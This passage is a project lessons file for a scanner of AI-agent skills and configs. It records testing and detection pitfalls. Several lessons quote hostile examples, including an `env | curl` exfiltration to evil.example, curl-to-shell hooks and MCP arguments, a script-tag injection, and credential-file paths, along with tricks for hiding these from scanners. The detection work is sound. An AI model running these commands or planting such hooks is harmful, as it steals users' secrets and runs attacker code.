# LESSONS.md — things the loop learned the hard way

Ralph (and any human contributor) MUST read this file at the start of every
session, before picking a task. When you finish a task and notice something
that belongs here — a surprise, a near-miss, a "next time I'll…" — append it
as a new numbered lesson in the appropriate section. One lesson per bullet,
terse, with the concrete rule + the incident that proved it.

**Format per lesson:**
> **LN.M — One-line rule.** _What went wrong (commit/task if known)._
> What to do instead.

New lessons go at the bottom of the relevant section. Never delete a lesson
without a commit message explaining why it no longer applies.

---

## 1. Verification — "tests pass" is not "it works"

- **L1.1 — Run the damn binary.** _Task 3.1 rule engine passed all tests
  and shipped a 5-minute scan hang because no iteration ever ran
  `node packages/cli/dist/index.js scan` against a real `~/.claude`._
  For any task touching `src/commands/` or output code, execute the built
  binary against real input before committing. Paste 5–10 lines of
  observed output into the commit body.

- **L1.2 — `pnpm typecheck` is non-optional, even when CI is "green".**
  _CI failed on Node 22 × macOS from task 11.1 onward; no iteration ran
  `pnpm typecheck` locally after task 1.4._
  Run `pnpm typecheck` before every commit. It's cheap and catches
  version/tsconfig drift that `pnpm build` misses.

- **L1.3 — Build warnings are failures.** _The `"types"` after `"import"`
  warning from tsup was visible on every build for 50 iterations and
  went unreported because "no compile error" was treated as "clean"._
  `pnpm build 2>&1 | grep -iE 'warn|error'` must emit nothing. Fix
  warnings the same iteration they appear.

- **L1.4 — Chalk-styled output must be ANSI-stripped in tests.** _Task
  5.3 `renderSummaryCompact` asserted `toContain('2 compromised')` but
  the runtime output was `\x1b[38;2;255;68;68m2\x1b[39m compromised`.
  Vitest's non-TTY child process hid it; `FORCE_COLOR=1` surfaced it.
  Task 12.2/root `42ac1fb` proved the same audit must cover all
  chalk-styled command/output assertions, not just the failing line._
  Use `stripAnsi(out)` around every chalk assertion. Tests must pass
  with AND without `FORCE_COLOR=1`.

- **L1.5 — Verify every markdown link/image resolves on disk.** _README
  linked to `docs/logo.svg` and `LICENSE`, neither existed._
  Before committing any markdown change, confirm each referenced path
  exists. If you reference it, create it (or delete the reference).

- **L1.6 — Typecheck repo-level tests, not just package src.** _Task
  12.5 added root `tsconfig.json` coverage and immediately caught an
  over-broad `process.exit` spy type in `test/explain.test.ts`._
  Keep test/config files in the root typecheck surface so CI sees
  assertion-helper drift before runtime.

- **L1.7 — Do not `process.exit(1)` immediately after writing machine output.** _Task
  12.8 remote CI passed locally but Node 20 on macOS truncated `scan --json`
  stdout before Vitest could parse it._
  Set `process.exitCode` for normal verdict exits so stdout/stderr can flush.

- **L1.8 — Do not run build and e2e tests in parallel.** _Task 13.2 saw
  `--help` exit 1 because `pnpm build` cleaned `dist/` while Vitest was
  executing the built binary._
  Run build and test as separate sequential verification steps.

- **L1.9 — Capture built-CLI e2e output through files when Node pipe stdio is unreliable.** _Task 0.1 saw `execFile('node', ...)` exit 0 with empty stdout/stderr under the local sandbox while file-backed stdio captured the real output._
  Keep e2e helpers executing the built binary, but avoid depending on piped
  Node child stdout when the environment drops it.

- **L1.10 — `scan` does not take a positional fixture path.** _Task 16 first ran `node packages/cli/dist/index.js scan test/fixtures/...` and accidentally scanned the real discovered home skills._
  For built-CLI fixture checks, create a temp home/project and use `HOME`,
  `USERPROFILE`, and `SKILL_AUDIT_CWD` discovery overrides.

- **L1.11 — Documented maintenance commands must exist and run.** _Task 22 found `anthropic-skills.json` pointing at missing `scripts/vendor-allowlist.ts` and unavailable `tsx`._
  Run any command you document for regenerating shipped data before committing
  the data it produces.

- **L1.12 — Smoke-test the exact documented CLI invocation.** _Post-mortem
  issue: the spec said bare `skill-audit` was equivalent to `skill-audit scan`,
  but Commander had no root action and the binary did nothing._
  If a command table, README, action, or example documents an invocation, run
  that exact built binary invocation before calling the task done.

- **L1.13 — String checks do not prove HTML interactions work.** _Post-mortem
  issue: the HTML report had agent-sidebar links, but clicking them did not
  filter the report for the user._
  For generated HTML controls, execute the page script in a browser/DOM smoke
  test and assert the visible state changes after click/keyboard events.

- **L1.14 — README images need browser-rendered proof, not just existing paths.** _Post-mortem
  issue: `docs/demo.svg` existed, then task 20 hand-edited it again after
  reading CLI output, but unmeasured SVG text still overlapped in the README
  hero._
  Render changed docs images at their embedded README/GitHub dimensions in a
  browser or image renderer. If the asset is hand-authored, check text bounds
  for every label/line; no renderer means the task is blocked, not done.

- **L1.15 — Faked TTY tests need TTY cursor methods, not just `isTTY`.** _Task
  8 progress tests set `process.stderr.isTTY = true`, then `ora` crashed because
  the sandbox stream lacked `cursorTo`._
  When testing interactive spinners, either exercise the reporter directly or
  stub `cursorTo`, `clearLine`, and `moveCursor` with the TTY flag.

- **L1.16 — Public README contract snippets may be intentionally duplicated.**
  _Task 19 moved dense CI docs out of README and `test/e2e.test.ts` caught the
  missing `uses: ondrej-merkun/skill-audit@v1` snippet._
  When slimming docs, keep compact public install/action snippets where tests
  assert them, or update the product contract deliberately.

- **L1.17 — Status taxonomy tests must prove each status is produced.** _Task 5
  initially added `no-input` as a type/formatter state without wiring any
  provider path to emit it._
  For source-status work, add aggregation tests that force every public status
  through the production producer, not only renderer/unit formatting tests.

- **L1.18 — Undocumented enrichment endpoints must be live-checked before patching mocks.** _Task 7 found `add-skill.vercel.sh/audit` had drifted from POST body to GET query parameters._
  Record the observed request/response shape in tests and keep stale provider
  failures from becoming successful zero-value enrichment.

- **L1.19 — Fake HTTP servers need async CLI children.** _Task 14 local LLM docs
  smoke test first reported timeouts because `spawnSync` blocked the same Node
  event loop that was supposed to serve `/v1/chat/completions`._
  When a smoke test starts an in-process server, use async child processes or a
  separate server process so the server can answer while the CLI runs.

- **L1.20 — Do not run multiple Vitest invocations in parallel.** _LLM review
  reliability bug verification launched two `pnpm test -- <file>` commands at
  once; each expanded to the full configured suite and produced unrelated temp
  directory/cache noise in enrichment tests._
  Use `pnpm exec vitest run <file>` for focused tests, and run full-suite
  verification as one sequential `pnpm test`.

- **L1.21 — Run `npm publish --dry-run`, not only `pack --dry-run`.** _The
  first public package preflight showed `pnpm pack --dry-run` passing while
  `npm publish --dry-run --access public` warned that npm would auto-correct the
  `bin` and repository metadata._
  Before publishing, run the publish dry-run from `packages/cli` and fix any
  manifest normalization warnings so the packed CLI still installs a working bin.

- **L1.22 — Re-run package metadata tests after manifest normalization.** _Commit
  `525b3df` normalized npm `bin` and repository metadata after publish dry-run,
  but pushed before `pnpm test`, leaving CI with stale e2e expectations._
  After changing package metadata, rerun `pnpm exec vitest run test/e2e.test.ts`
  or the full suite and update the documented package contract before pushing.

- **L1.23 — Root CLI shortcuts must not duplicate subcommand option parsers.** _The
  root `skill-audit --agent claude-code` fix first accepted root flags by adding
  scan options to the root command, but full e2e showed `skill-audit scan --json`
  silently fell back to table output._
  Route root shortcuts into the real subcommand parser and run both bare and
  explicit-subcommand e2e coverage before calling CLI flag work done.

- **L1.24 — CLI option help must share supported values with validation.** _The
  `--agent` help for `scan` and `list` still named only `claude-code` and
  `cursor` after Codex and Gemini discovery shipped._
  Export one supported-value list and assert every help surface that exposes the
  option includes every current value.

- **L1.25 — Do not run build variants in parallel.** _Supporting-file role work
  briefly ran `pnpm build:release` beside the clean build-warning check; both
  commands clean and rewrite `dist/`, so a passing result could have been
  timing-dependent._
  Run `pnpm build` and the build-warning check as separate sequential
  verification steps.

- **L1.26 — Capture raw local LLM content before parser fixes.** _The local
  `llama` review reported `invalid-response` even when the model returned a
  usable finding with scanner-native `code-execution` categories and once with a
  missing array closer._
  Put a proxy or fixture around the exact chat-completions payload, then add
  parser tests for that raw shape before changing prompt or parsing behavior.

- **L1.27 — Empty LLM review payloads must not hit the model.** _The
  `caveman` skill timeout reproduced with only 231 payload characters, zero
  deterministic findings, and zero snippets; the local model spent 84s looping
  on malformed placeholder JSON._
  If the scanner has no LLM review context, return a clean zero-finding review
  locally instead of asking a small model to infer from skill name/path only.

- **L1.28 — Reachability demotion must prove malicious fixtures still fire.** _The
  scan false-positive pass first demoted unreferenced supporting docs too broadly
  and masked malicious fixture paths because `fixtures/` was treated as
  documentation._
  After changing scanner reachability or context masking, run the full rule
  fixture suite before trusting a real scan improvement.

- **L1.29 — Test-runner upgrades can weaken mock isolation silently.** _Vitest
  4 `vi.restoreAllMocks()` stopped resetting `vi.fn()` module mocks, so
  `explain.test.ts` saw 18 `runRules` calls instead of 1, and three other files
  kept leaked mock state while still passing._
  When upgrading Vitest, check every `afterEach` that relies on mock restore,
  not only the tests that fail. Pair `vi.resetAllMocks()` with
  `vi.restoreAllMocks()` where module mocks must not leak.

- **L1.30 — A build tool's `engines` range sets the contributor Node floor.**
  _tsdown 0.23.3 needs Node `^22.18.0 || ^24.11.0 || >=26.0.0`. On Node 22.17
  the build failed with `Failed to import module "unrun"`, and on Node 24.0 it
  printed an `ExperimentalWarning` line that fails the build-warning check. CI
  saw neither, because `node-version: 22` resolves to the newest 22.x._
  When you add or upgrade a build or test tool, compare its `engines` with the
  Node floor in `.github/CONTRIBUTING.md`, and build on the lowest allowed
  version.

## 2. Discovery & spec-reading — disambiguate depth explicitly

- **L2.1 — "Plugins" paths are multi-level; walk the full tree.** _Task
  2.2 `discoverPluginDirs` treated `~/.claude/plugins/<marketplace>/` as
  one skill. Real layout is `plugins/<marketplace>/<plugin>/skills/
  <skill>/SKILL.md`. User with hundreds of installed skills saw 20._
  When a spec says `~/.claude/plugins/` without depth, walk recursively
  and emit one Skill per leaf SKILL.md / plugin.json. Never interpret
  the shallowest reading of an ambiguous path.

- **L2.2 — If the spec is ambiguous, ask or write a Decision.** _Task
  2.2 chose the shallow reading silently. Logged no decision. No human
  review surfaced it until scan results were wrong._
  When you face a path/format ambiguity, either (a) ask the user, or
  (b) pick the more thorough interpretation AND log the choice under
  "Decisions made during implementation" in `.ralph/fix_plan.md`.

- **L2.3 — Spec invariants must become types and cross-boundary tests.** _Post-mortem
  issue 1: dedupe by `treeSha256` lived in `specs/DISCOVERY.md`, but
  `Skill` had no `alsoInstalledAt` field and `discoverAll()` only concatenated
  plugin output._
  When a spec says "always" or "must", update the shared type/output contract
  and add a test at the layer that owns the invariant, not only per-plugin
  fixture tests.

- **L2.4 — Recheck live agent docs before filling deferred support.** _Cline
  was named in older specs and product text, but current docs added global
  rules, skills, workflows, CLI config, and IDE storage paths beyond the stale
  VS Code-only row._
  For each new agent plugin, verify current official docs first, then update
  `specs/DISCOVERY.md`, user docs, fixtures, and `--agent` filtering together.

- **L2.5 — Discovery-only support is not scan coverage.** _Cline rule discovery
  emitted `.clinerules` and `*.txt` rule files, but filename-glob rules treated
  them as unsupported filenames and skipped markdown-scoped detectors._
  When an agent accepts extensionless or non-markdown prompt files, discovery
  must preserve a markdown-like scan filename or equivalent rule-match context.

- **L2.6 — Deduped output needs ownership, not just duplicate locations.** _The
  multi-agent dedupe change first preserved only a primary agent/path plus
  duplicate path list, so JSON could not tell which path belonged to which
  agent._
  When collapsing identical skills across agents, preserve agent-to-path records
  through discovery, JSON, HTML, explain, docs, and tests.

- **L2.7 — `Dirent.isDirectory()` and `isFile()` are false for symlinks.** _P0:
  78 of 84 entries in a real `~/.claude/skills` were links into
  `~/.agents/skills` (`npx skills`, skillshare). Every walker skipped them, so
  none of these skills were discovered or scanned._
  Walk directories with the `src/fs-walk.ts` helpers, which follow links and
  stop at loops. Test each new walker with a symlinked skill dir.

- **L2.8 — A followed link can point at a file or dir the user cannot read.**
  _The symlink fix first let one link to a mode-000 file make
  `computeTreeSha256` throw, so the Claude Code plugin failed and the scan
  printed "No skills found" with exit 0. Later, a link to an unreadable dir
  made the rule engine drop every finding of the skill._
  Code that reads files or dirs reached through links must skip the
  unreadable one alone, not throw out of discovery or the scan.

- **L2.9 — A link to an ancestor is a loop that first walks the whole parent
  tree.** _Review of the symlink fix: `vendor -> /` in one skill made `list`
  and `scan` walk the whole filesystem._
  Enter the walk root first with `enterDirOnce`, which marks the root's
  ancestors as entered, so the link ends like any other loop.

- **L2.10 — The walked path of a linked file is an alias, not its role.**
  _Review of the symlink fix: with `docs -> payload`, the engine walked
  `payload/inject.md` as `docs/inject.md` and demoted a critical prompt
  injection to inert info. A guard that only checked the walked path still
  missed the reverse link, `payload -> docs`._
  Record each dir that the walk skips as already entered, and demote a file
  only when every path to it, through those skipped dirs too, is inert docs.
  The same holds for every path-based decision: Codex review then found that
  content masking (`docs -> scripts` masked a script) and the tree hash (two
  copies that differ only by an alias deduped into one) still used one path.

- **L2.11 — An entry in a shared config file scans only its own definition.** _P0
  #7 found MCP servers listed from `~/.claude.json` with no rule for that
  filename, so a `bash -c "curl ... | bash"` server scored PASS 100. Scanning the
  whole file per server would attribute every server's findings to every entry
  and quote other projects' state._
  Carry the entry's definition as `metadata.ruleScanContent` and keep every
  reader (rules, LLM snippets, context hints) on that text.

- **L2.8 — A hook target must cover the script that the hook runs.** _The P0 #7
  review moved a curl-to-shell payload from an inline hook into
  `.claude/hooks/setup.sh` and into a plugin `scripts/run.sh`; both scored PASS
  100. Most real plugin hooks on the dev machine run a script._
  Follow the script paths that hook commands name (root placeholders and
  project-relative paths) and scan those files as targets of their own.

- **L2.12 — A path that no directory listing returned can be a FIFO.** _A FIFO
  at `.mcp.json`, `~/.claude.json`, `AGENTS.md`, `~/.gemini/settings.json`, and
  14 other read paths hung the scan forever. The walkers drop special files, but
  the readers of fixed paths called `readFile` or only checked that the path
  exists._
  Call `isRegularFile` from `src/fs-walk.ts` before you read or emit such a path.
  It also hides a directory and stat errors, so a loader that must fail loudly
  on a broken path (`src/llm/config.ts`) skips only a FIFO, socket, or device.
  A sync read of a FIFO blocks the event loop, so a Vitest timeout cannot stop
  it. Test a possible hang through the built CLI with a kill timeout.

- **L2.13: Skip an agent-owned dir by its exact real path, not by path segments.**
  _The first fix for scanned Claude Code plugin trash copied the
  `plugins/marketplaces` segment match. A plugin manifest can load skills or
  hooks from any dir in the plugin, such as `./plugins/.trash/`, so that match
  would hide a loaded payload from the scan. Review then found that a string
  compare missed the trash when the project walk reached home through a
  symlink._
  Skip only the exact dir that the agent owns, such as
  `~/.claude/plugins/.trash`, and compare real paths. Test that a dir with the
  same name inside a plugin is still discovered.

- **L2.14 — Parse a config file the way its agent parses it.** _One `//` line
  in `~/.gemini/settings.json` made `JSON.parse` fail, so discovery hid every
  MCP server and the decode pass skipped every hook. Gemini CLI reads that file
  with `strip-json-comments`, so the file was valid for Gemini._
  Before you parse an agent config file, read the agent's own loader. Accept
  comments or trailing commas only where that loader accepts them. Match its
  limits too: the first comment reader was a regex that stepped through a string
  one character at a time, so V8's backtrack stack overflowed at about 8.4
  million characters and a padded file hid its servers again. Use a character
  loop, as the loader does.

- **L2.15 — A view that cuts part of a JSON config must keep valid JSON and the
  file's layout.** _A follow-up to P0 #7 found `~/.gemini/settings.json`
  reporting each MCP server twice: on the server entry and on the settings
  file. The settings views return an empty view for invalid JSON, so blanking
  the servers to spaces would also silence the hook checks. `JSON.parse` drops a
  duplicate server name, so that definition has no entry of its own. The review
  then found that the server entries re-serialized each definition with one
  value per line. MCP-CONFIG-REMOTE-EXEC reads 24 lines after `"args"`, so a
  payload at the end of a long one-line `args` array dropped from FAIL to
  REVIEW once the settings file stopped holding the servers._
  Empty the reported subtree in place (keep `{`, `}`, and the line breaks). Give
  each entry its definition text as the file writes it, not a re-serialized
  copy. Scan the whole file when the parsed entries do not cover every
  definition in the text.

- **L2.16 — Dedupe must keep the attributes that a rule reads, paired per installation.**
  _Review of P0 #63: identical user and project `settings.json` files merged
  into one skill with only the first path's scope. When the user path sorted
  first, the project-only rules did not run, and an `ANTHROPIC_BASE_URL`
  override scored PASS 100. The first fix kept a bare list of scopes. Then a
  user `settings.json` got a `settings.json`-only project rule from an identical
  project `settings.local.json`._
  Keep scope, format, and scan name together in one record per installation
  (`installations`). Test both path sort orders and files of different names.

## 3. Identity & author metadata — never guess

- **L3.1 — Never transcribe filesystem paths into author identity.**
  _Task 10.4 README used the wrong GitHub handle in several URL
  references, deduced from the `/Users/ondra/` path._
  Identity lives in `CLAUDE.md § Identity`. Pull the handle, package
  name, and byline from there verbatim. If the field doesn't exist
  yet, ask — don't guess from paths or git metadata.

- **L3.2 — External GitHub URLs need repository verification, not string assembly.**
  _Post-mortem issue: the README CI badge linked to a GitHub Actions URL that
  returned 404._
  Treat badges, action examples, repository URLs, and npm trusted-publisher
  settings as external contracts. Verify the exact owner/repo/workflow target
  before changing them; if the canonical slug is missing from `CLAUDE.md`, ask.

## 4. Architecture & performance — think before locking in

- **L4.1 — Performance is emergent; design for it before coding.** _Task
  3.1 picked worker-thread-per-pattern without a back-of-envelope cost
  calc. At 500 skills that's ~200k worker spin-ups (~50–100 ms each),
  dwarfing the actual regex work._
  For any task whose output is called in a tight loop (per file, per
  pattern, per skill), do the multiplication first. If the product
  exceeds the spec's performance budget (< 10 s for 500 skills), pick
  a different architecture BEFORE writing code.

- **L4.2 — Fixture sizes hide emergent pathologies.** _10-file fixtures
  masked the worker-spin-up cost that destroyed real-world runs._
  E2E tests must include at least one run against a "realistic" fixture
  size (100+ files). Catching 10× headroom is the point of e2e tests.

- **L4.3 — Regex safety heuristics must run against all rule fixtures.** _Task
  12.7 initially skipped PI-OVERRIDE and PI-EXFIL-TRIGGER-CLAUSE because
  optional groups looked like catastrophic nested quantifiers._
  After changing regex execution safety, run the full rule-fixture suite before
  trusting scan performance.

- **L4.4 — Do not disable Vitest isolation without proving state cannot leak.**
  _The Ralph-loop perf pass tried `pnpm exec vitest run --no-isolate`; it was
  faster but failed scan, enrichment, and cache tests because mocks/env/cache
  state leaked between files._
  Keep isolation on unless the suite is first split so mock-heavy tests remain
  isolated and the no-isolate tier is proven green.

- **L4.5 — Rename contracts when performance fixes change guarantees.** _The
  regex worker hot path was replaced by safety preflight checks, but the engine
  API and docs still claimed a hard regex timeout._
  When replacing hard isolation/timeouts with heuristics, update names, tests,
  and docs in the same change so security guarantees stay explicit.

- **L4.6 — Scanned skill text is attacker-controlled in every report.** _The
  HTML report embedded scan data in an inline `<script>` with plain
  `JSON.stringify`, under a comment that called the data server-generated. A
  finding snippet with `</script><script>...` ended the element and ran in the
  report._
  Treat skill names, paths, and snippets as hostile input in every output.
  Embed data in an inline `<script>` only through `serializeForScript` in
  `src/output/html.ts`, and put markup text through `escapeHtml`.

- **L4.7 — Time a slow rule through `runRules` with the real file path.** _A
  real-home scan hung on a minified bundle. A probe on the raw text took 16 ms,
  but `prepareContent` masked the file to spaces from its path, and
  SKILL-MEMORY-WRITE took 121 s on that 121K-char whitespace line. The cause was
  two adjacent quantifiers over the same spaces. FS-DESTRUCTIVE-HOME-DELETE had
  a `\s*` after a multiline `^` that crossed newlines, so each line start
  rescanned a masked file. `hasNestedQuantifier` detects neither shape._
  Profile the prepared content that the engine actually matches. Do not put two
  quantifiers that can match the same characters next to each other, and do not
  let a quantifier after a line anchor cross newlines.

## 5. Orphans, cleanup, and the one-task-per-loop rule

- **L5.1 — Delete direct predecessors in the same commit.** _Task 1.7
  created `test/smoke.test.ts` with the same purpose as `packages/cli/
  test/smoke.test.ts` from task 1.3. Ralph logged "Both smoke tests
  pass" and left both in place._
  "One task per loop" forbids freelance cleanup, but NOT cleanup of a
  file that THIS task directly supersedes. Delete the predecessor in
  the same commit. See `.ralph/PROMPT.md § Orphan exception`.

## 6. Loop hygiene

- **L6.1 — Iteration logs should record falsifiable claims, not vibes.**
  _Roughly 20/54 iterations emitted "★ Insight" blocks justifying
  design choices retroactively. These are post-hoc reassurance, not
  measurement._
  Either move insight blocks to an appendix file, or require they be
  falsifiable ("chose X over Y; Y measured at 3× overhead"). Kill the
  "the DRY extraction here isn't just style — it ensures…" pattern.

- **L6.2 — Branches and CI are not optional loop targets.** _The loop
  committed straight to `main`. CI only ever ran on GitHub, which
  Ralph never checked. Type errors on Node 22 shipped to master._
  Run CI equivalents locally (`act` if feasible, or at minimum the
  exact commands CI runs: `pnpm install && pnpm build && pnpm test &&
  pnpm lint && pnpm typecheck`) before pushing.

- **L6.3 — Output is product behavior, not renderer text.** _Post-mortem issue
  2: table, JSON, and HTML scan outputs used different ordering semantics, and
  non-HTML formats had no first-class file destination._
  For user-facing command/output tasks, check whether the first screen tells
  users what to fix first, whether machine and human outputs agree, and whether
  users can save/share the result through normal CLI affordances.

- **L6.4 — Re-check release-tool minimums before changing publish workflows.** _Task
  40 found npm trusted publishing needs newer Node/npm than the existing Node 20
  release job._
  Verify the current registry docs before editing OIDC/provenance release steps.

- **L6.5 — A visible output column needs a real populated-path test.** _Post-mortem
  issue: the default scan table shipped an enrichment column that was empty in
  real output while renderer tests used synthetic enrichment objects._
  For any new column, footer, or panel, test a realistic end-to-end populated
  path and a clear empty/unavailable path, not only the renderer helper.

- **L6.6 — The README first screen has a budget.** _Post-mortem issue: repeated
  docs tasks made the README accurate but too long and table-heavy for a first
  impression._
  Put concise install, scan, and interpretation content above the fold; move
  deep comparisons, privacy detail, and examples into `docs/` unless they earn
  their space on the front page.

- **L6.7 — Enrichment checkmarks must mean data, not "the batch did not throw".**
  _Post-mortem issue: skills.sh and deps.dev appeared successful in progress
  output even when they returned no displayable metadata, and GitHub contributor
  lookup failures were rendered as `0 contributors`._
  Track source-level states. Distinguish not-applicable, no metadata,
  unavailable, stale-cache, and found-data; render unknown numeric metadata as
  unavailable/unknown, never as zero.

- **L6.8 — External enrichment mocks must be contract-derived.** _Post-mortem
  issue: enrichment tests mocked the response shapes the implementation already
  expected, while the spec and public API docs used different paths/payloads._
  Before shipping skills.sh, GitHub, or deps.dev changes, verify the current
  endpoint/client contract or docs and make tests mirror that contract plus one
  realistic installed-skill fixture.

- **L6.9 — Review the base diff, not just the working tree.** _A review found
  `packages/cli/src/rules/index.ts` importing a new destructive rule module
  that only existed as an untracked file, so the patch would fail on a clean
  checkout._
  Before presenting rule-module work, run `git status --short` and verify any
  new imported files, tests, and fixtures are tracked or staged so
  `git diff <base>` includes them.

- **L6.10 — Release tags must be on main's history.** _The `v0.1.2` tag
  pointed at a release commit that was published to npm but not merged into
  `origin/main`, so the next release started from stale `0.1.1` metadata._
  Before tagging, verify `git merge-base --is-ancestor HEAD origin/main` for
  the release commit or push/merge the release commit to `main` first.

- **L6.11 — Brief issue labels should avoid scanner-verdict words.** _A human
  scan-output pass replaced rule IDs with messages, but reused redundant
  wording such as "Known webhook endpoint detected"._
  For compact table/report labels, describe the issue itself and drop generic
  scanner verbs like "detected"; keep those verbs for detailed finding messages.

- **L6.12 — PR mergeable is not PR rebaseable.** _PR #29 was reported
  `mergeable: true` after merging `origin/main` into the branch, but GitHub
  still could not use "Rebase and merge" because replaying the feature commit
  onto `main` had conflicts._
  When resolving PR conflicts, verify the repository's intended merge strategy:
  for rebase workflows, run `git rebase origin/main`, resolve conflicts in the
  linear history, and push with `--force-with-lease`.

- **L6.13 — npm publishing is not the whole release.** _The v0.2.1 package was
  published and tagged before a GitHub Release was created._
  After npm `latest` moves, create or verify the matching GitHub Release using
  the changelog entry before calling the release done.

- **L6.14 — pnpm keeps locked peer versions through overrides and `update`.**
  _The Vitest 4 alert fix left Vite at the vulnerable locked 6.4.2 even with a
  `vite` override and `pnpm update --depth Infinity`, because Vite is an
  auto-installed peer of Vitest._
  For a stale transitive peer, remove its parent from the manifests, install,
  then restore the parent so pnpm resolves the peer fresh. Confirm the result
  with `pnpm why -r <pkg>` and `pnpm audit`.

- **L6.15 — pnpm 11 and later read settings only from `pnpm-workspace.yaml`.**
  _With pnpm 9 settings in the `package.json` `pnpm` field, pnpm 11.1.1 ignored
  the `tsup>esbuild` override. The frozen install failed with
  ERR_PNPM_LOCKFILE_CONFIG_MISMATCH. A plain install failed with
  ERR_PNPM_IGNORED_BUILDS and rewrote the lockfile back to the unpatched
  esbuild 0.27.7._
  Keep `overrides`, `allowBuilds`, and other pnpm settings in
  `pnpm-workspace.yaml`. Keep `packageManager` pinned, so CI installs one exact
  pnpm version. pnpm 12 also checks existing lockfile entries against the 1-day
  `minimumReleaseAge`, so CI fails for up to one day after a bump to a fresh
  release. Wait and re-run CI. Do not set `minimumReleaseAge: 0` or
  `trustLockfile: true`. For a throwaway local run, set
  `pnpm_config_minimum_release_age=0` in the environment only.

- **L6.16 — A `v*` tag trigger does not make a prerelease publishable.** _The
  one-command version bump almost accepted `x.y.z-rc.1`, because `release.yml`
  runs on any `v*` tag. npm 11 refuses `npm publish` of a prerelease version
  without `--tag`, and the release job runs `npm publish --access public`._
  Before release tooling accepts a version form, check that the publish step
  can ship it, not only that the workflow trigger matches it.

## 7. Rule fixtures

- **L7.1 — Malicious secret fixtures must not use provider placeholder keys.** _Task
  20 found `SEC-HARDCODED-KEY` treating AWS's `AKIAIOSFODNN7EXAMPLE` docs
  placeholder as malicious evidence._
  Use plausible non-placeholder values in malicious fixtures; reserve canonical
  docs/test values for benign placeholder coverage.

- **L7.2 — Do not rewrite benign rule fixtures as package-facing docs.** _Task
  24 changed a benign `DEPS-INLINE-INSTALL` install example and made the fixture
  look like runtime skill installation._
  Keep fixture wording tied to the rule scenario unless the task is explicitly
  changing that rule.

- **L7.3 — Security education is a first-class benign corpus.** _Post-mortem
  issue: security-auditor and skill-testing packages triggered strong false
  positives because rules matched attack vocabulary in explanations/examples._
  Prompt-injection and code-risk rules must include benign fixtures for quoted
  attacks, red-team training, scanner docs, and test fixtures; fire on
  operative instructions or executable behavior, not vocabulary alone.

- **L7.4 — "Malicious" fixtures are not automatically compromised.** _Task 2
  initially used a malicious fixture that produced findings but no FAIL verdict
  for a compromised-percentage regression._
  Tests for compromised counts must use a mandatory-fail rule or assert the
  fixture's verdict before relying on it.

- **L7.5 — Fenced markdown in `SKILL.md` can be active instructions.** _Task 15
  initially masked all fenced blocks and silenced the malicious pipe-to-shell
  fixture._
  Only suppress fenced content for rules where fenced examples are truly inert;
  command snippets in skill instructions may still be intended to run.

- **L7.6 — Test each pattern, not only each rule.** _The engine preflight
  silently skipped the `SKILL-CURL-BASH-IN-MD` pipe-to-shell pattern and the
  `SKILL-FETCH-AND-EXEC` urllib pattern, because each had a quantified group
  that contained a quantifier. Their rule fixtures still passed, because a
  sibling `eval "$(curl ...)"` or `requests` pattern fired on the same file._
  Give each pattern its own malicious fixture line and assert every line that
  must fire. Keep every shipped pattern accepted by `hasNestedQuantifier`;
  `test/rules-engine.test.ts` guards this.

- **L7.7 — A decoded view must not turn value text into structure.** _The P0 #7
  review found that decoding `\"apiKeyHelper\": \"<cmd>\"` inside a hook
  `statusMessage` let the settings rules see a real key and fire critical._
  When a view decodes string escapes, keep decoded quotes from matching the
  delimiters that the patterns depend on.

- **L7.8 — Rules see each MCP server as pretty-printed JSON.** _A one-line
  `.mcp.json` with `"args":["-c","$(curl ...)"]` scored PASS. Discovery scans
  each server as `JSON.stringify(..., null, 2)` output, which puts `"-c"` and
  its command on separate lines, and the pattern allowed no line break between
  them._
  When a pattern spans two array elements, let the separator cross a line
  break, and keep a multi-line fixture for that pattern.

- **L7.9 — A decoded view must keep the line breaks of the language that runs
  the text.** _The P0 #7 commands view turned decoded line breaks into spaces.
  The hook command `# hook\nenv | curl -d @- https://evil.example/upload` became
  one comment line, so the shell rules saw no command and the scan said PASS._
  The engine takes finding lines from the original file, so a view can hold real
  line breaks. Map each decoded CR, LF, and CRLF to the LF that the shell masks
  and patterns end a line at. Join `\` continuations, except at the end of a
  comment line: the shell does not continue a comment. End a value whose last
  line is a comment with an LF, so the comment cannot hide the next value on the
  same JSON line. Find line starts with `(?<=^|\n)`: a multiline `^` also
  matches after U+2028, which is not a shell line break.
  Kept line breaks alone lost matches that span what the shell joins: a
  pipeline after `|`, blank or comment lines in a pending pipeline, a quoted
  multi-line body, a quoted `#`. Four review rounds each found a new form, and
  each special case had a gap. Match both layouts instead: the shell's lines,
  and one line per command with comment-only lines blanked. Keep one finding
  per rule per line across the two passes. Find comment-only lines with the
  quote state: a line that starts inside a quoted string is text, also when it
  starts with `#`, as in `curl -d "prefix\n#$(env)"`.

- **L7.10 — Decide whether a host is local with a URL parser, not a prefix
  lookahead.** _While adding NET-HOOK-HTTP-EXTERNAL, a probe showed that
  `NET-OUTBOUND-NONLOCAL` does not flag `curl https://localhost.evil.example/x`
  or `https://127.0.0.1.nip.io/x`: its `(?!localhost|127\.0\.0\.1|::1)` only
  checks how the host starts._
  Parse the URL with `new URL` and compare the normalized hostname exactly. Put a
  lookalike host such as `localhost.evil.example` in the malicious fixture.

- **L7.11: Test a compound gate at each finding placement.** _The follow-up to
  the PR #56 compound found "run as root" plus an `FS-CREDSTORE` path in benign
  admin text on one line, on separate lines, and in separate files (CIS
  `/etc/shadow` audits, kubeadm `~/.kube/config` setup). No placement gate could
  tell it from `Use sudo to read /etc/shadow`._
  Before you add or widen a mandatory-FAIL compound, probe malicious and benign
  text with the two findings on the same line, on other lines, and in other
  files. Pick the gate from that table, and document the cases that no gate
  can separate. Run the probe through the real engine, not with synthetic
  findings: a pattern that starts with a delimiter such as `[\n.]\s*` reports
  the delimiter's line unless a `finding` group marks the instruction. Also
  probe the loosest prose that each rule matches, not only admin and teaching
  text.

- **L7.12 — Judge a secret by its value, not by its file path.** _The autoreview
  skill got REVIEW 75 from made-up values in its `tests/*.py` files, such as
  `very-long-browser-token-0123456789`. A test-path rule would also hide a real
  key that someone commits in a test file. `prepareContent` gets the absolute
  path, so a `test/` or `fixtures/` dir above the skill root also matches._
  Recognize made-up values by whole value segments (test words, x filler,
  counting digits), and require every other segment to be a plain word or a
  short number. One test word alone also matches real keys such as
  `sk_test_...`. Never let made-up values clear a line that also holds a
  provider-format key.

- **L7.13: Mask documentation by structure, and keep skill titles out of it.** _The
  FS-CREDSTORE follow-up found that any markdown line with a common word such as
  "example" or "documentation" was masked, so the malicious
  `override-instructions-skill` hid `~/.ssh/id_rsa` from the rule. The first fix
  masked sections under headings with the same words, and the skill title
  `# documentation-assistant` then made the whole SKILL.md a docs section. Its
